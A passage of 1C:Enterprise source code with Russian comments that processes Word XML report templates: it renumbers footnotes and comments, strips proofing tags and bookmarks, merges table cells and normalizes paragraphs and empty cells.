		Контекст.ДанныеШаблона[ИмяВСтруктуре] = Лев(Контекст.ДанныеШаблона[ИмяВСтруктуре], Начало - 1) + ""<ОпределениеСносок>"" + Сред(Контекст.ДанныеШаблона[ИмяВСтруктуре], Конец);
		Начало = 1;
		Пока Начало > 0 Цикл
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ОпределениеСносок, ЗакрывающийТег, Начало) + ДлинаЗакрывающегоТега;
			Сноска = Сред(ОпределениеСносок, Начало, Конец - Начало);
			Контекст[ИмяВСтруктуре].Вставить(ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Сноска, ""w:id=""""""), Сноска);
			Начало = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ОпределениеСносок, ОткрывающийТег, Конец);
		КонецЦикла;
	КонецЕсли;
КонецПроцедуры

// Вставляет определение сносок в текст соответствующего файла в Контекст
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработатьСноски(Контекст, КонцевыеСноски = Ложь)
	Если КонцевыеСноски Тогда
		ИмяВСтруктуре = ""КонцевыеСноски"";
		ИмяТега = ""endnote"";
	Иначе
		ИмяВСтруктуре = ""Сноски"";
		ИмяТега = ""footnote"";
	КонецЕсли;
	Если ЗначениеЗаполнено(Контекст.ДанныеШаблона[ИмяВСтруктуре]) Тогда
		ТегСсылки = ""<w:"" + ИмяТега + ""Reference "";
		
		ОпределениеСносок = ?(ЗначениеЗаполнено(Контекст[ИмяВСтруктуре][""-1""]), Контекст[ИмяВСтруктуре][""-1""], """") + ?(ЗначениеЗаполнено(Контекст[ИмяВСтруктуре][""0""]), Контекст[ИмяВСтруктуре][""0""], """");
		Текст = Контекст.ДанныеШаблона.ТекстШаблона;
		Контекст.ДанныеШаблона.ТекстШаблона = """";
		Шаг = 1;
		Начало = Найти(Текст, ТегСсылки);
		Пока Начало > 0 Цикл
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, ""/>"", Начало) + 2;
			ИД = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Текст, ""w:id="""""", Начало, Конец);
			ТекстСноски = Контекст[ИмяВСтруктуре][ИД];
			СтрокаИДСноски = ""w:id="""""" + ИД + """""""";
			НачалоИД = Найти(ТекстСноски, СтрокаИДСноски);
			ОпределениеСносок = ОпределениеСносок + ?(НачалоИД > 0, Лев(ТекстСноски, НачалоИД + 5) + Шаг + Сред(ТекстСноски, НачалоИД + СтрДлина(СтрокаИДСноски) - 1), ТекстСноски);
			Контекст.ДанныеШаблона.ТекстШаблона = Контекст.ДанныеШаблона.ТекстШаблона + Лев(Текст, Начало - 1) + ТегСсылки + ""w:id="""""" + Шаг + """"""/>"";
			Текст = Сред(Текст, Конец);
			Начало = Найти(Текст, ТегСсылки);
			Шаг = Шаг + 1;
		КонецЦикла;
		Контекст.ДанныеШаблона.ТекстШаблона = Контекст.ДанныеШаблона.ТекстШаблона + Текст;
		Начало = Найти(Контекст.ДанныеШаблона[ИмяВСтруктуре], ""<ОпределениеСносок>"");
		Контекст.ДанныеШаблона[ИмяВСтруктуре] = Лев(Контекст.ДанныеШаблона[ИмяВСтруктуре], Начало - 1) + ОпределениеСносок + Сред(Контекст.ДанныеШаблона[ИмяВСтруктуре], Начало + СтрДлина(""<ОпределениеСносок>""));
	КонецЕсли;
КонецПроцедуры

#КонецОбласти

#Область ПроцедурыИФункцииОбработкиПримечаний

// Считать определение примечаний в текст соответствующего файла в Контекст
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура СчитатьОпределениеПримечаний(Контекст)
	Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.Примечания) Тогда
		Контекст.Примечания = Новый Соответствие;
		ОткрывающийТег = ""<w:comment "";
		ЗакрывающийТег = ""</w:comment>"";
		ДлинаЗакрывающегоТега = СтрДлина(ЗакрывающийТег);
		
		Начало = Найти(Контекст.ДанныеШаблона.Примечания, ОткрывающийТег);
		Конец = Найти(Контекст.ДанныеШаблона.Примечания, ""</w:comments>"");
		ОпределениеПримечаний = Сред(Контекст.ДанныеШаблона.Примечания, Начало, Конец - Начало);
		Контекст.ДанныеШаблона.Примечания = Лев(Контекст.ДанныеШаблона.Примечания, Начало - 1) + ""<ОпределениеПримечаний>"" + Сред(Контекст.ДанныеШаблона.Примечания, Конец);
		Начало = 1;
		Пока Начало > 0 Цикл
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ОпределениеПримечаний, ЗакрывающийТег, Начало) + ДлинаЗакрывающегоТега;
			Примечание = Сред(ОпределениеПримечаний, Начало, Конец - Начало);
			Контекст.Примечания.Вставить(ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Примечание, ""w:id=""""""), Примечание);
			Начало = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ОпределениеПримечаний, ОткрывающийТег, Конец);
		КонецЦикла;
	КонецЕсли;
КонецПроцедуры

// Вставляет определение примечаний в текст соответствующего файла в Контекст
//
// Параметры:
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработатьПримечания(Контекст)
	Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.Примечания) Тогда
		ОпределениеПримечаний = """";
		Текст = Контекст.ДанныеШаблона.ТекстШаблона;
		Контекст.ДанныеШаблона.ТекстШаблона = """";
		Шаг = 0;
		Начало = Найти(Текст, ""<w:commentReference "");
		Пока Начало > 0 Цикл
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, ""/>"", Начало) + 2;
			ИД = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Текст, ""w:id="""""", Начало, Конец);
			ТекстПримечания = Контекст.Примечания[ИД];
			СтрокаИД = ""w:id="""""" + ИД + """""""";
			НачалоИД = Найти(ТекстПримечания, СтрокаИД);
			ОпределениеПримечаний = ОпределениеПримечаний + ?(НачалоИД > 0, Лев(ТекстПримечания, НачалоИД + 5) + Шаг + Сред(ТекстПримечания, НачалоИД + СтрДлина(СтрокаИД) - 1), ТекстПримечания);
			Контекст.ДанныеШаблона.ТекстШаблона = Контекст.ДанныеШаблона.ТекстШаблона + Лев(Текст, Начало - 1) + ""<w:commentReference w:id="""""" + Шаг + """"""/>"";
			ИзменитьИДГраницПримечания(Контекст.ДанныеШаблона.ТекстШаблона, ИД, Шаг);
			Текст = Сред(Текст, Конец);
			Начало = Найти(Текст, ""<w:commentReference "");
			Шаг = Шаг + 1;
		КонецЦикла;
		Контекст.ДанныеШаблона.ТекстШаблона = Контекст.ДанныеШаблона.ТекстШаблона + Текст;
		Начало = Найти(Контекст.ДанныеШаблона.Примечания, ""<ОпределениеПримечаний>"");
		Контекст.ДанныеШаблона.Примечания = Лев(Контекст.ДанныеШаблона.Примечания, Начало - 1) + ОпределениеПримечаний + Сред(Контекст.ДанныеШаблона.Примечания, Начало + СтрДлина(""<ОпределениеПримечаний>""));
	КонецЕсли;
КонецПроцедуры

// Заменяет старое значение идентиикатора границ примечания на новое
//
// Параметры:
//  сТекст - строка - текст, в котором содержится определение примечание
//  ИД - строка - старый идентификатор примечания
//  НовыйИД - строка - новый идентифкатор примечания
//
Процедура ИзменитьИДГраницПримечания(сТекст, ИД, НовыйИД)
	Тег = ""<w:commentRangeEnd w:id="""""" + ИД + """"""/>"";
	Начало = ПостроительОтчетовКлиентСервер.НайтиСправа(сТекст, Тег);
	Если Начало > 0 Тогда
		сТекст = Лев(сТекст, Начало - 1) + ""<w:commentRangeEnd w:id="""""" + НовыйИД + """"""/>"" + Сред(сТекст, Начало + СтрДлина(Тег));
	КонецЕсли;
	Тег = ""<w:commentRangeStart w:id="""""" + ИД + """"""/>"";
	Начало = ПостроительОтчетовКлиентСервер.НайтиСправа(сТекст, Тег);
	Если Начало > 0 Тогда
		сТекст = Лев(сТекст, Начало - 1) + ""<w:commentRangeStart w:id="""""" + НовыйИД + """"""/>"" + Сред(сТекст, Начало + СтрДлина(Тег));
	КонецЕсли;
КонецПроцедуры

#КонецОбласти

#Область ПроцедурыИФункцииНормализацииШаблона

// Нормализация шаблона отчета
//
// Параметры:
//  ДанныеШаблона - структура, содержащая данные шаблона
//
Процедура НормализоватьШаблон(сТекст, ОбработкаКолонтитулов = Ложь)
	УдалитьПроверкуОрфографии(сТекст);
	УдалитьПодразделы(сТекст);
	//УдалитьЯзыковыеНастройки(сТекст);
	УдалитьЗакладки(сТекст);
	УдалитьСмартТеги(сТекст);
	Если Не ОбработкаКолонтитулов Тогда
		УдалитьПростыеПоля(сТекст);
	КонецЕсли;
КонецПроцедуры

// Удаляет из текста шаблона тэги проверки орфографии
//
// Параметры:
// 	сТекст - in out, строка, содержащая кусок текста шаблона
//
Процедура УдалитьПроверкуОрфографии(сТекст)
	сТекст = СтрЗаменить(сТекст, ""<w:proofErr w:type=""""spellStart""""/>"", """");
	сТекст = СтрЗаменить(сТекст, ""<w:proofErr w:type=""""spellEnd""""/>"", """");
	сТекст = СтрЗаменить(сТекст, ""<w:proofErr w:type=""""gramStart""""/>"", """");
	сТекст = СтрЗаменить(сТекст, ""<w:proofErr w:type=""""gramEnd""""/>"", """");
КонецПроцедуры

// Удаляет из текста шаблона тэги подразделов
//
// Параметры:
// 	сТекст - in out, строка, содержащая кусок текста шаблона
//
Процедура УдалитьПодразделы(сТекст)
	сТекст = СтрЗаменить(сТекст, ""<wx:sub-section>"", """");
	сТекст = СтрЗаменить(сТекст, ""</wx:sub-section>"", """");
КонецПроцедуры

// Удаляет из текста шаблона тэги свойств языка
//
// Параметры:
// 	сТекст - in out, строка, содержащая кусок текста шаблона
//
//Процедура УдалитьЯзыковыеНастройки(сТекст)
//	сТекст = СтрЗаменить(сТекст, ""<w:lang w:val=""""EN-US""""/>"", """");
//КонецПроцедуры

// Удаляет из текста шаблона тэги свойств документа
//
// Параметры:
//  ДанныеШаблона - структура, содержащая данные шаблона
//
Процедура УдалитьСвойстваДокумента(ДанныеШаблона)
	Если ЗначениеЗаполнено(ДанныеШаблона.СвойстваДокумента) Тогда
		Начало = Найти(ДанныеШаблона.СвойстваДокумента, ""<cp:coreProperties"");
		Если Начало > 0 Тогда
			Начало = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ДанныеШаблона.СвойстваДокумента, ""<"", Начало + 18);
			Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ДанныеШаблона.СвойстваДокумента, ""</cp:coreProperties>"", Начало);
			ДанныеШаблона.СвойстваДокумента = Сред(ДанныеШаблона.СвойстваДокумента, 1, Начало - 1) + Сред(ДанныеШаблона.СвойстваДокумента, Конец, СтрДлина(ДанныеШаблона.СвойстваДокумента) - Конец + 1);
		КонецЕсли;
	КонецЕсли;
КонецПроцедуры

// Удаление определения закладок
//
// Параметры:
// 	сТекст - in out, строка, содержащая кусок текста шаблона
//
Процедура УдалитьЗакладки(сТекст)
	сТекст = ПостроительОтчетовКлиентСервер.УдалитьТэги(сТекст, ""w:bookmarkStart"");
	сТекст = ПостроительОтчетовКлиентСервер.УдалитьТэги(сТекст, ""w:bookmarkEnd"");
КонецПроцедуры

// Удаление определения полей
//
// Параметры:
// 	сТекст - in out, строка, содержащая кусок текста шаблона
//
Процедура УдалитьПростыеПоля(сТекст)
	сТекст = ПостроительОтчетовКлиентСервер.УдалитьТэги(сТекст, ""w:fldSimple"");
	сТекст = СтрЗаменить(сТекст, ""</w:fldSimple>"", """");
КонецПроцедуры

// Удаление смарт-тегов
//
// Параметры:
// 	сТекст - in out, строка, содержащая кусок текста шаблона
//
Процедура УдалитьСмартТеги(сТекст)
	// удаляем сперва свойства с содержимым, а потом сами тэги, иначе удаление тэгов, удалит и начало определений свойств
	сТекст = ПостроительОтчетовКлиентСервер.УдалитьТэгиССодержимым(сТекст, ""w:smartTagPr"");
	сТекст = ПостроительОтчетовКлиентСервер.УдалитьТэги(сТекст, ""w:smartTag"");
	сТекст = СтрЗаменить(сТекст, ""</w:smartTag>"", """");
КонецПроцедуры

#КонецОбласти

#Область ФункцияСчитыванияШаблонаОтчета

// Считывает шаблон во внутренню структуру для дальнейшей обработки
//
// Параметры:
//  ДанныеШаблона - структура, содержащая данные шаблона
//  Итерация - число, номер обрабатываемой итерации, если 0, то обрабатываются все секции
//
// Возвращаемое значение:
//  массив - элементами которого являются:
// 			а) Строка
// 			б) Структура ""секция"" - тип и другие параметры секции, а также вложенный в секцию кусок шаблона 
//	  			в виде внутренней структуры (массива)
//
Функция СчитатьСтруктуруШаблона(сТекст, ЗначенияАтрибутов, Итерация = 0)
	// шаблон с разметкой элементами управления содержимым
	Если Найти(сТекст, ""<w:sdt>"") > 0 Тогда
		Возврат СчитатьСтруктуруШаблонаСЭлементамиУправленияСодержимым(сТекст, ЗначенияАтрибутов, Итерация);
	// шаблон с XML разметкой
	ИначеЕсли Найти(сТекст, ""<ns0:"") > 0 Тогда
		Сообщить(""Формат разметки шаблона с помощью Word XML больше не поддерживается! Обратитесь в службу поддержки!"");
	// шаблон с разметкой полями формул
	ИначеЕсли Найти(сТекст, "" = ["") > 0 Или Найти(сТекст, "" = ]"") > 0 Тогда
		Сообщить(""Формат разметки шаблона с помощью полей формул больше не поддерживается! Обратитесь в службу поддержки!"");
	// шаблон собственного формата
	ИначеЕсли Найти(сТекст, ""<ШаблонОтчета>"") > 0 Тогда
		Возврат СчитатьСтруктуруШаблонаСобственныйФормат(сТекст);
	КонецЕсли;
	
	// дошли до сюда - возвращаем текст шаблона как есть
	Возврат сТекст;
КонецФункции

#КонецОбласти

#Область ПроцедураОбработкиСчитаннногоШаблонаОтчета

// Формирует отчет (или его часть) на основе заданного шаблона (или его фрагмента)
//
// Параметры:
//  СтруктШаблон - массив - шаблон отчета во внутренней структуре (или его фрагмент)
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаШаблона(СтруктШаблон, Контекст)
	Перем Элем;
	
	Если ТипЗнч(СтруктШаблон) = Тип(""Строка"") Тогда
		Если Не Контекст.РежимКоммент Тогда
			Контекст.Рез.ДобавитьСтроку(СтруктШаблон);
		КонецЕсли;
		Возврат;
	КонецЕсли;
	Для Каждого Элем Из СтруктШаблон Цикл 
		Если ТипЗнч(Элем) = Тип(""Строка"") Тогда
			Если Не Контекст.РежимКоммент Тогда
				Контекст.Рез.ДобавитьСтроку(Элем);
			КонецЕсли;
		Иначе
			ОбработкаСекции(Элем, Контекст);
		КонецЕсли;
	КонецЦикла;
КонецПроцедуры

#КонецОбласти

#Область ПроцедураОбработкиКолонтитуловОтчета

// Выполняет обработку массива нижних (footer1.xml, footer2.xml...) или верхних (header1.xml, header2.xml...) колонтитулов
// 
// Параметры:
//  Колонтитулы - массив нижних (footer1.xml, footer2.xml...) или верхних (header1.xml, header2.xml...) колонтитулов
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработатьКолонтитулы(Колонтитулы, Контекст)
	Для Шаг = 0 По Колонтитулы.Количество() - 1 Цикл
		Контекст.Рез.Очистить();
		НормализоватьШаблон(Колонтитулы[Шаг], Контекст.ОбработкаКолонтитулов);
		СтруктураКолонтитула = СчитатьСтруктуруШаблона(Колонтитулы[Шаг], Контекст.ЗначенияАтрибутов, Контекст.Итерация);
		ОбъединитьОдноименныеСекции(СтруктураКолонтитула);
		
		ОбработкаШаблона(СтруктураКолонтитула, Контекст);
		Колонтитулы[Шаг] = Контекст.Рез.ПолучитьТекст();
		
		Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.ОпределениеСписков) Тогда
			РестартСписковDocx(Колонтитулы[Шаг], Контекст.ОпределениеСписков, Контекст.СсылкиСписков);
		КонецЕсли;
		
		ОбъединениеЯчеек(Колонтитулы[Шаг]);
		Если Контекст.УдалитьНеобработанные Тогда
			УдалитьНеобработанныеЭлементыРазметки(Колонтитулы[Шаг]);
		Иначе
			ОбработкаПустыхСекций(Колонтитулы[Шаг]);
		КонецЕсли;	
		ОбработкаАбзацев(Колонтитулы[Шаг]);
		ОбработкаБлоковТекстаСодержащихТолькоПробел(Колонтитулы[Шаг]);
		Колонтитулы[Шаг] = ОбработкаПустыхЯчеек(Колонтитулы[Шаг]);
	КонецЦикла;
КонецПроцедуры

#КонецОбласти

#Область ПроцедурыИФункцииНормализацииСформированногоОтчета

// Вставляет в текст теги вертикального объединения ячеек таблицы вместо тегов построителя <ns0:Объединить>
//
// Параметры:
//  ДанныеШаблона - структура содержащая текст отчтеа и остальные параметры, необходимые для формирования отчета
//
Процедура ОбъединениеЯчеек(сТекст)
	сНовТекст = """";
	ПозСекцОбъеден = Найти(сТекст, ""<ns0:Объединить>"");
	Пока Не (ПозСекцОбъеден = 0) Цикл
		РеСтарт = КодСимвола(сТекст, ПозСекцОбъеден + СтрДлина(""<ns0:Объединить>"")) = КодСимвола(""0"");
		ПозКонецСекцОбъеден = Найти(сТекст, ""</ns0:Объединить>"") + СтрДлина(""</ns0:Объединить>"");
		// вырезаем текст секции объединения					  
		сТекст = Лев(сТекст, ПозСекцОбъеден - 1) + Сред(сТекст, ПозКонецСекцОбъеден); 
		// вставляем тег объеднения в начало тега <w:tcPr>, ближайшим слева к тегу Объединить  
		ТегМерж = ""<w:vMerge"" + ?(РеСтарт, "" w:val=""""restart""""/>"", ""/>"");
		ПозТегМерж = ПостроительОтчетовКлиентСервер.НайтиСправа(Лев(сТекст, ПозСекцОбъеден - 1), ""<w:tcPr>"");
		Если ПозТегМерж = 0 Тогда
			// нет тега <w:tcPr>, обрамляем тег мерж, скобками тега <w:tcPr>, и вставляем в начало тега 
			ТегМерж = ""<w:tcPr>"" + ТегМерж + ""</w:tcPr>"";
			ПозТегМерж = ПостроительОтчетовКлиентСервер.НайтиСправа(Лев(сТекст, ПозСекцОбъеден - 1), ""<w:tc>"");
			Если ПозТегМерж > 0 Тогда
				// позиция тега мерж сразу после <w:tc>
				ПозТегМерж = ПозТегМерж + СтрДлина(""<w:tc>"");
			КонецЕсли;
		Иначе
			// позиция тега мерж сразу после <w:tcPr>
			ПозТегМерж = ПозТегМерж + СтрДлина(""<w:tcPr>"");
		КонецЕсли;
			
		Если ПозТегМерж > 0 Тогда
			// вставляем ТегМерж в нужную позицию 
			сНовТекст = сНовТекст + Лев(сТекст, ПозТегМерж - 1) + ТегМерж;
			сТекст = Сред(сТекст, ПозТегМерж); 
		Иначе
			сНовТекст = сНовТекст + Лев(сТекст, ПозСекцОбъеден - 1);
			сТекст = Сред(сТекст, ПозСекцОбъеден); 
		КонецЕсли;
		ПозСекцОбъеден = Найти(сТекст, ""<ns0:Объединить>"");
	КонецЦикла;
	Если Не ПустаяСтрока(сНовТекст) Тогда
		сТекст = сНовТекст + сТекст;
	КонецЕсли;
КонецПроцедуры

// Удаляет из текста шаблона необработанные элементы разметки
//
// Параметры:
// 	сТекст - in, строка, содержащая кусок текста шаблона
//
Процедура УдалитьНеобработанныеЭлементыРазметки(сТекст)
	НачалоСекции = Найти(сТекст, ""<w:sdt>"");
	Если НачалоСекции > 0 Тогда
		сТекст = СтрЗаменить(СтрЗаменить(сТекст, ""</w:sdtContent>"", """"), ""</w:sdt>"", """");
		Пока НачалоСекции > 0 Цикл
			НачалоСодержимого = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, ""<w:sdtContent>"", НачалоСекции) + 14;
			сТекст = Лев(сТекст, НачалоСекции - 1) + Сред(сТекст, НачалоСодержимого);
			НачалоСекции = Найти(сТекст, ""<w:sdt>"");
		КонецЦикла;
	КонецЕсли;
КонецПроцедуры

// Поиск определения родительских элементов разметки (открытые, но не закрытые в переданном куске текста)
//
// Параметры:
//  сТекст - строка - обрабатываемый фрагмент текста
//
// Возвращаемое значение:
//  Массив - содержащий определения родительских элементов разметки
//
Функция ПолучитьРодительскиеСекции(Знач сТекст)
	Рез = Новый Массив;
	НачалоОткр = Найти(сТекст, ""<w:sdt>"");
	НачалоЗакр = Найти(сТекст, ""</w:sdt>"");
	Пока НачалоОткр > 0 Или НачалоЗакр > 0 Цикл
		Если НачалоОткр > 0 И (НачалоЗакр = 0 Или НачалоЗакр > НачалоОткр) Тогда
			КонецОткр = Найти(сТекст, ""<w:sdtContent>"") + 14;
			Рез.Добавить(Сред(сТекст, НачалоОткр, КонецОткр - НачалоОткр));
			сТекст = Сред(сТекст, КонецОткр);
		Иначе
			Рез.Удалить(Рез.Количество() - 1);
			сТекст = Сред(сТекст, НачалоЗакр + 8);
		КонецЕсли;
		НачалоОткр = Найти(сТекст, ""<w:sdt>"");
		НачалоЗакр = Найти(сТекст, ""</w:sdt>"");
	КонецЦикла;
	
	Возврат Рез;
КонецФункции

// Вставляет в текст реальные абзацы вместо тегов построителя ""<новабзац>""
//
// Параметры:
//  ДанныеШаблона - структура содержащая текст отчтеа и остальные параметры, необходимые для формирования отчета
//
Процедура ОбработкаАбзацев(сТекст)
	// ищем метку нового абзаца
	ПозСекцНовАбзац = Найти(сТекст, ""<новабзац>"");
	Пока ПозСекцНовАбзац > 0 Цикл
		// разбиваем строку на две части: 1) до <новабзац> и 2) после <новабзац>
		ЛеваяЧасть = Лев(сТекст, ПозСекцНовАбзац - 1); 
		ПраваяЧасть = Сред(сТекст, ПозСекцНовАбзац + 10); 
		ТекстЗамены = ""</w:t></w:r>"";
		РазрывТекста = ""<w:br/>"";
		// находим ближайший слева тег абзаца
		ПозАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоАбзацаСправа(ЛеваяЧасть);
		Текст = Сред(ЛеваяЧасть, ПозАбзаца);
		// ищем перенос строки и родительские элементы разметки для <новабзац>, если в абзаце нет переноса строки и <новабзац>
		// не в содержимом элементов разметки, то вместо <новабзац> вставляем теги абзаца, иначе <w:br/>
		ПозРазрыва = Найти(Текст, РазрывТекста);
		Если ПозРазрыва = 0 И ПолучитьРодительскиеСекции(Текст).Количество() = 0 Тогда
		// !!! Закоментировано, описание ниже
		//Если ПозРазрыва = 0 Тогда
			РазрывТекста = """";
			// Находим текст которым будем заменять <новабзац> для этого нам надо взять начало ближайшего слева тега абзаца до <w:t> включительно
			// и добавить в начало </w:t></w:r></w:p>, т.е. вместо <новабзац> мы закрываем и открываем точно такой же абзац как и предыдущий,
			КонецСвойствАбзаца = Найти(Текст, ""</w:pPr>"");
			// !!! Закоментировано, т.к. при такой реализации вставляемый абзац оказывается вне родительского элемента разметки, будет
			// !!! вставляться <w:br/>, но это тоже не хорошо, потому что при такой реализации теряется определение свойств абзаца
			// получаем родительские элементы разметки и дописываем по ним в конец первого абзаца закрывающие тэги элементов разметки,
			// а так же формируем строку с определением открывающих тэгов элементов разметки, для вставки в начало второго абзаца
			//ОпределениеСекций = """";
			//Если ДанныеШаблона.Свойство(""ЗначенияАтрибутов"") Тогда
			//	Для Каждого РодительскаяСекция Из ПолучитьРодительскиеСекции(Текст) Цикл
			//		ТекстЗамены = ТекстЗамены + ""</w:sdtContent></w:sdt>"";
			//		// получаем идентификатор как есть и с помощью функции, так делается потому что идентификатор в XML может быть отрицательным,
			//		// но MS Word в объектной модели считывает его как 4294967296 + ЗначениеИдентификатора, значит и нам так надо
			//		Идентификатор = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(РодительскаяСекция, ""<w:id w:val="""""");
			//		ИД = ПолучитьИдентификаторСекции(РодительскаяСекция);
			//		// получаем атрибуты элемента разметки
			//		Атрибуты = ДанныеШаблона.ЗначенияАтрибутов.Получить(ИД);
			//		// увеличиваем старый идентификатор на 1 пока не получим идентификатор, которого нет в тексте шаблона
			//		НовыйИД = Число(ИД) + 1;
			//		НовыйИДСтрока = Формат(НовыйИД, ""ЧГ="");
			//		НовыйИДСтрокаДляПоиска = ""<w:id w:val="""""" + НовыйИДСтрока + """""""";
			//		Пока Найти(сТекст, НовыйИДСтрокаДляПоиска) > 0 Цикл
			//			НовыйИД = НовыйИД + 1;
			//			НовыйИДСтрока = Формат(НовыйИД, ""ЧГ="");
			//			НовыйИДСтрокаДляПоиска = ""<w:id w:val="""""" + НовыйИДСтрока + """""""";
			//		КонецЦикла;
			//		// записываем атрибуты старого элемемента разметки с новым идентификатором
			//		ДанныеШаблона.ЗначенияАтрибутов.Вставить(НовыйИДСтрока, Атрибуты);
			//		// дописываем определение элемента разметки с новым идентификатором
			//		ОпределениеСекций = ОпределениеСекций + СтрЗаменить(РодительскаяСекция, ""<w:id w:val="""""" + Идентификатор + """""""", НовыйИДСтрокаДляПоиска);
			//	КонецЦикла;
			//КонецЕсли;
			ТекстЗамены = ТекстЗамены + ""</w:p>"";
			// если нет свойств абзаца, то вырезаем только определение абзаца
			Если КонецСвойствАбзаца = 0 Тогда
				ТекстЗамены = ТекстЗамены + Лев(Текст, Найти(Текст, "">""));
			Иначе
				// в свойствах абзаца ищем определение списка, если его нет, то копируем определение
				// абзаца как есть, иначе копируем без определения списка
				НачалоОпределенияСписка = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(Текст, ""w:numPr"", КонецСвойствАбзаца);
				КонецСвойствАбзаца = КонецСвойствАбзаца + 7;
				Если НачалоОпределенияСписка = 0 Тогда
					ТекстЗамены = ТекстЗамены + Лев(Текст, КонецСвойствАбзаца);
				Иначе
					КонецОпределенияСписка = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, ""</w:numPr>"", НачалоОпределенияСписка) + 10;
					ТекстЗамены = ТекстЗамены + Лев(Текст, НачалоОпределенияСписка - 1) + Сред(Текст, КонецОпределенияСписка, КонецСвойствАбзаца - КонецОпределенияСписка + 1);
				КонецЕсли;
			КонецЕсли;
			// !!! Закоментировано, описание выше
			//ТекстЗамены = ТекстЗамены + ОпределениеСекций;
		//Иначе
		ИначеЕсли ПозРазрыва > 0 Тогда
			Текст = Лев(Текст, ПозРазрыва);
		КонецЕсли;
		// если для текста определены свойства, то формируем строку с их учетом
		НачалоТекста = ПостроительОтчетовКлиентСервер.НайтиНачалоБлокаТекстаСправа(Текст); 
		КонецСвойствТекста = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, ""</w:rPr>"", НачалоТекста);
		Если КонецСвойствТекста = 0 Тогда
			ТекстЗамены = ТекстЗамены + ""<w:r>"" + РазрывТекста + ""<w:t>"";
		Иначе
			ТекстЗамены = ТекстЗамены + Сред(Текст, НачалоТекста, КонецСвойствТекста - НачалоТекста + 8) + РазрывТекста + ""<w:t>"";
		КонецЕсли;
		// формируем итоговый текст шаблона
		сТекст = ЛеваяЧасть + ТекстЗамены + ПраваяЧасть;
		// ищем метку нового абзаца
		ПозСекцНовАбзац = Найти(сТекст, ""<новабзац>"");
	КонецЦикла;
КонецПроцедуры

// обработка и нормализация ячейки
//
// Параметры:
//  сТекст - строка - текст ячейки
//
Функция ОбработкаПустойЯчейки(сТекст)
	// ищем в тексте ячейки таблицу
	Если Найти(сТекст, ""<w:tbl>"") > 0 Тогда
		// если есть хотя бы одна таблица, то вызываем ее обработку
		сРезТекст = ОбработкаПустыхЯчеек(сТекст);
		// если между концом таблицы и концом ячейки нет абзаца, 
		// то вставляем пустой свернутый абзац
		цПозКонца = ПостроительОтчетовКлиентСервер.НайтиСправа(сРезТекст, ""</w:tbl>"") + 7;
		сВрем = Сред(сРезТекст, цПозКонца + 1, СтрДлина(сРезТекст) - цПозКонца - 7);
		Если ПостроительОтчетовКлиентСервер.НайтиНачалоАбзаца(сВрем) = 0 Тогда
			сРезТекст = Лев(сРезТекст, цПозКонца) + сВрем + ""<w:p/></w:tc>"";
		КонецЕсли;
		
		Возврат сРезТекст;
	ИначеЕсли ПостроительОтчетовКлиентСервер.НайтиНачалоАбзаца(сТекст) = 0 Тогда
		// если нет таблицы, то проверяем наличие абзаца, 
		// если его нет, то добавляем пустой абзац
		Возврат СтрЗаменить(сТекст, ""</w:tc>"", ""<w:p></w:p></w:tc>"");
	Иначе
		// ячейка не требует нормализации
		Возврат сТекст;
	КонецЕсли;
КонецФункции

// обработка таблицы на наличие пустых ячеек
//
// Параметры:
//  сТекст - строка - текст таблицы
//
Функция ОбработкаПустыхЯчеекТаблицы(сТекст)
	сРезТекст = """";
	цПозКонцаПред = 1;
	цПозНачала = Найти(сТекст, ""<w:tc>"");
	Пока цПозНачала > 1 Цикл
		цПозКонца = ПостроительОтчетовКлиентСервер.НайтиИндексКонцаТэга(сТекст, цПозНачала + СтрДлина(""<w:tc>""), ""<w:tc>"", ""</w:tc>"");
		сРезТекст = сРезТекст + Сред(сТекст, цПозКонцаПред, цПозНачала - цПозКонцаПред) + 
					ОбработкаПустойЯчейки(Сред(сТекст, цПозНачала, цПозКонца - цПозНачала));
		цПозНачала = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, ""<w:tc>"", цПозКонца);
		цПозКонцаПред = цПозКонца;
	КонецЦикла;
	
	Возврат сРезТекст + Сред(сТекст, цПозКонцаПред, СтрДлина(сТекст) - цПозКонцаПред + 1);
КонецФункции

// Добавляет пустые абзацы в пустые ячейки таблиц. С точки зрения Ворда в ячейке обязан быть абзац
// хотябы пустой, но при обработке шаблона может случиться так, что ячейка останется пустой.
//
